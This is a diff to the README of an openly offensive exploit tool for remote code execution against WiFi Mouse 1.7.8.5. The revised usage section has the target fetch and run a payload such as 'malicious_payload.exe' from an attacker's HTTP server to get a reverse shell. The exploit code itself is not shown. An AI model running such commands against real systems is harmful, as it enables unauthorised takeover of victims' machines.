@@ -1,4 +1,4 @@
-# WiFi-Mouse-1.7.8.5---Remote-Code-Execution-v3-
+# WiFi-Mouse-1.7.8.5 Remote Code Execution (RCE) v3
 
 This is a Python-based exploit for the WiFi Mouse (version 1.7.8.5) that leverages a Remote Code Execution (RCE) vulnerability.
 
@@ -13,4 +13,13 @@ The exploit connects to the WiFi Mouse server on the target machine over port 19
 ## Usage
 
 ```bash
-python3 exploit.py <target-ip> <tun0> <rev_shell payload>
+python3 exploit.py <target-ip> <local-http-server-ip> <rev_shell payload>
+```
+- `<target-ip>`: The IP address of the target machine running the vulnerable WiFi Mouse server.
+- `<local-http-server-ip>`: The IP address of the attacker's HTTP server hosting the payload.
+- `<payload-name>`: The name of the payload to be executed on the target.
+
+### Example
+
+```bash
+python3 exploit.py 192.168.1.10 192.168.1.5 malicious_payload.exe
